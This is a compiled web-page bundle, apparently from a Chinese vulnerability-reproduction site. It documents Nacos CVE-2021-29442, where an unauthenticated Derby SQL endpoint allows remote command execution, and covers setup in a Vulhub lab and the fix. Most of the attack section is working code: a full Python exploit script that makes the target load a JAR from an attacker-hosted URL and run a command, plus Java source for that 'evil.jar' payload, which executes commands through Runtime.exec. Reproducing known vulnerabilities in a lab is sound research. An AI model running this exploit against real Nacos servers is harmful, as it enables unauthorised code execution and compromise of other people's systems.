import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Nacos 是一个设计用于动态服务发现、配置和服务管理的易于使用的平台。",-1),d=n("p",null,[s("在 Nacos 1.4.1 之前的版本中，一些 API 端点（如 "),n("code",null,"/nacos/v1/cs/ops/derby"),s("）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意 Derby SQL 语句和 Java 代码。")],-1),k=n("p",null,"参考链接：",-1),v={href:"https://github.com/advisories/GHSA-xv5h-v7jh-p2qh",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/alibaba/nacos/issues/4463",target:"_blank",rel:"noopener noreferrer"},b={href:"http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce",target:"_blank",rel:"noopener noreferrer"},h={href:"https://nacos-group.github.io/blog/announcement-derby-ops-api/?source=news/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://nacos.io/zh-cn/docs/v2/guide/user/auth.html",target:"_blank",rel:"noopener noreferrer"},_=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Nacos未鉴权（Nacos&lt;1.4.1）且使用Derby数据库作为内置数据源
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Alibaba Nacos 1.4.0 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务器启动后，访问 <code>http://your-ip:8848/nacos/</code> 可以看到 Nacos 的默认登录页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240716174011999.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),f={href:"https://github.com/vulhub/vulhub/blob/master/nacos/CVE-2021-29442/evil.jar",target:"_blank",rel:"noopener noreferrer"},y=n("code",null,"http://some-webserver/evil.jar",-1),x=t(`<p>执行 <a href="poc.py">POC</a>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py -t http://your-ip:8848 -s http://some-webserver/evil.jar -c &quot;id&quot;  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>-t</code> 参数指定目标地址，<code>-s</code> 参数指定恶意 JAR 包的地址，<code>-c</code> 参数指定要执行的命令。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240716175547902.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,5),w={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},S=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> random
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin
<span class="token keyword">import</span> argparse


<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> command<span class="token punctuation">,</span> service<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    removal_url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/nacos/v1/cs/ops/data/removal&#39;</span><span class="token punctuation">)</span>
    derby_url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/nacos/v1/cs/ops/derby&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>maxsize<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        post_sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;&quot;&quot;CALL sqlj.install_jar(&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>service<span class="token punctuation">}</span></span><span class="token string">&#39;, &#39;NACOS.</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">&#39;, 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#39;derby.database.classpath&#39;, &#39;NACOS.</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">&#39;)
CREATE FUNCTION S_EXAMPLE_</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#39;test.poc.Example.exec&#39;
&quot;&quot;&quot;</span></span>
        get_sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;select * from (select count(*) as b, S_EXAMPLE_</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">(&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&#39;) as a from config_info) tmp&quot;</span></span>
        files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;file&#39;</span><span class="token punctuation">:</span> post_sql<span class="token punctuation">}</span>
        post_resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>removal_url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
        post_json <span class="token operator">=</span> post_resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> post_json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">and</span> post_json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>post_resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            get_resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>derby_url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&#39;sql&#39;</span><span class="token punctuation">:</span> get_sql<span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>get_resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
            <span class="token keyword">break</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Exploit script for Nacos CVE-2021-29442&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--target&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Target URL&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--command&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Command to execute&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-s&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--service&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Service URL&#39;</span><span class="token punctuation">)</span>
    
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    exploit<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>command<span class="token punctuation">,</span> args<span class="token punctuation">.</span>service<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>evil.jar</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>package test.poc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;

public class Example {
  public static void main(String[] args) {
    String ret = exec(&quot;ipconfig&quot;);
    System.out.println(ret);
  }
  
  public static String exec(String cmd) {
    StringBuffer bf = new StringBuffer();
    try {
      String charset = &quot;utf-8&quot;;
      String osName = System.getProperty(&quot;os.name&quot;);
      if (osName != null &amp;&amp; osName.startsWith(&quot;Windows&quot;))
        charset = &quot;gbk&quot;; 
      Process p = Runtime.getRuntime().exec(cmd);
      InputStream fis = p.getInputStream();
      InputStreamReader isr = new InputStreamReader(fis, charset);
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while ((line = br.readLine()) != null)
        bf.append(line); 
    } catch (Exception e) {
      StringWriter writer = new StringWriter();
      PrintWriter printer = new PrintWriter(writer);
      e.printStackTrace(printer);
      try {
        writer.close();
        printer.close();
      } catch (IOException iOException) {}
      return &quot;ERROR:&quot; + writer.toString();
    } 
    return bf.toString();
  }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,4),q={href:"https://nacos-group.github.io/blog/announcement-derby-ops-api/?source=news/",target:"_blank",rel:"noopener noreferrer"},A=n("code",null,"/nacos/v1/cs/ops/derby",-1),E={href:"https://nacos.io/zh-cn/docs/v2/guide/user/auth.html",target:"_blank",rel:"noopener noreferrer"};function N(R,j){const a=o("ExternalLinkIcon");return i(),c("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/advisories/GHSA-xv5h-v7jh-p2qh"),e(a)])]),n("li",null,[n("a",m,[s("https://github.com/alibaba/nacos/issues/4463"),e(a)])]),n("li",null,[n("a",b,[s("http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce"),e(a)])]),n("li",null,[n("a",h,[s("https://nacos-group.github.io/blog/announcement-derby-ops-api/?source=news/"),e(a)])]),n("li",null,[n("a",g,[s("https://nacos.io/zh-cn/docs/v2/guide/user/auth.html"),e(a)])])]),_,n("p",null,[s("将恶意 JAR 包 "),n("a",f,[s("evil.jar"),e(a)]),s(" 上传到攻击者的 HTTP 服务器上，例如 "),y,s("。")]),x,n("p",null,[n("a",w,[s("poc.py"),e(a)])]),S,n("ul",null,[n("li",null,[n("a",q,[s("https://nacos-group.github.io/blog/announcement-derby-ops-api/?source=news/"),e(a)]),s(" 关于 Nacos Derby 数据库运维接口 "),A,s(" 相关问题公告")]),n("li",null,[n("a",E,[s("https://nacos.io/zh-cn/docs/v2/guide/user/auth.html"),e(a)]),s(" Nacos 鉴权文档")])])])}const L=p(l,[["render",N],["__file","Nacos 未授权接口命令执行漏洞 CVE-2021-29442.html.vue"]]);export{L as default};
